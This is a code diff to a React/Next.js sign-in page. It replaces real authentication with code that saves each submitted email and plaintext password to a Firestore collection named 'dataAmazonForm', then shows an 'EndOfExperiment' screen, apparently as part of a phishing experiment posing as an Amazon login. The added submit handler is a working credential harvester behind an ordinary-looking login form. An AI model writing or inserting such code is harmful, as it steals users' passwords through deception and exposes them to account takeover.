@@ -8,9 +8,12 @@ import LoginInput from "./LoginInput";
 import * as Yup from "yup";
 import ButtonInput from "./ButtonInput";
 import Router from "next/router";
+import { firestore } from "./../../firebaseConfig.js";
+import { addDoc, collection, Timestamp } from "firebase/firestore/lite";
 
 import { signIn } from "next-auth/react";
 import DotLoaderSpinner from "../loaders/dotLoader/DotLoaderSpinner";
+import EndOfExperiment from "../EndofExperiment";
 
 const initialUser = {
     login_email: "",
@@ -20,6 +23,8 @@ const initialUser = {
 
 const SignInPage = ({ providers, csrfToken, callbackUrl }: any) => {
     const [loading, setLoading] = useState(false);
+    const [dataStored, setDataStored] = useState(false);
+
     const [needHelp, setNeedHelp] = useState(false);
     const [user, setUser] = useState(initialUser);
     const { login_email, login_password, login_error } = user;
@@ -35,7 +40,7 @@ const SignInPage = ({ providers, csrfToken, callbackUrl }: any) => {
     const loginValidation = Yup.object({
         login_email: Yup.string()
             .required("Email address is required.")
-            .email("Please endter a valid address"),
+            .email("Please enter a valid address"),
         login_password: Yup.string().required("Please enter a password."),
     });
 
@@ -47,22 +52,44 @@ const SignInPage = ({ providers, csrfToken, callbackUrl }: any) => {
             password: login_password,
         };
 
-        const res = await signIn("credentials", options);
-        setUser({
-            ...user,
-            login_error: "",
-        });
-        setLoading(false);
 
-        if (res?.error) {
-            setLoading(false);
-            setUser({
-                ...user,
-                login_error: res?.error,
+        try {
+            const ref = collection(firestore, "dataAmazonForm");
+            await addDoc(ref, {
+              login_email,
+              login_password,
+              sentAt: Timestamp.now().toDate(),
             });
-        } else {
-            return Router.push(callbackUrl || "/");
-        }
+            setLoading(false);
+            setDataStored(true);
+            return 0;
+          } catch (err) {
+            console.log(err)
+            setLoading(false);
+            setDataStored(true);
+
+            return -1;
+          }
+
+      
+
+
+        // const res = await signIn("credentials", options);
+        // setUser({
+        //     ...user,
+        //     login_error: "",
+        // });
+        // setLoading(false);
+
+        // if (res?.error) {
+        //     setLoading(false);
+        //     setUser({
+        //         ...user,
+        //         login_error: res?.error,
+        //     });
+        // } else {
+        //     return Router.push(callbackUrl || "/");
+        // }
     };
 
     return (
@@ -90,7 +117,7 @@ const SignInPage = ({ providers, csrfToken, callbackUrl }: any) => {
                         onSubmit={() => signInHandler()}
                     >
                         {(form) => (
-                            <Form method="post" action="/api/auth/signin/email">
+                            <Form method="post">
                                 <input
                                     type="hidden"
                                     name="csrfToken"
@@ -129,7 +156,7 @@ const SignInPage = ({ providers, csrfToken, callbackUrl }: any) => {
                         )}
                     </div>
 
-                    <div className="flex flex-col md:flex-row">
+                    {/* <div className="flex flex-col md:flex-row">
                         {providers.map((provider: any) => {
                             if (provider.name === "Credentials") {
                                 return;
@@ -152,7 +179,7 @@ const SignInPage = ({ providers, csrfToken, callbackUrl }: any) => {
                                 </div>
                             );
                         })}
-                    </div>
+                    </div> */}
 
                     <div
                         onClick={() => setNeedHelp(!needHelp)}
@@ -186,6 +213,10 @@ const SignInPage = ({ providers, csrfToken, callbackUrl }: any) => {
                         )}
                     </div>
                 </div>
+
+                {dataStored ? (<>
+                <EndOfExperiment />
+                </>):null}
 
                 <div className="flex flex-col mt-3">
                     <span
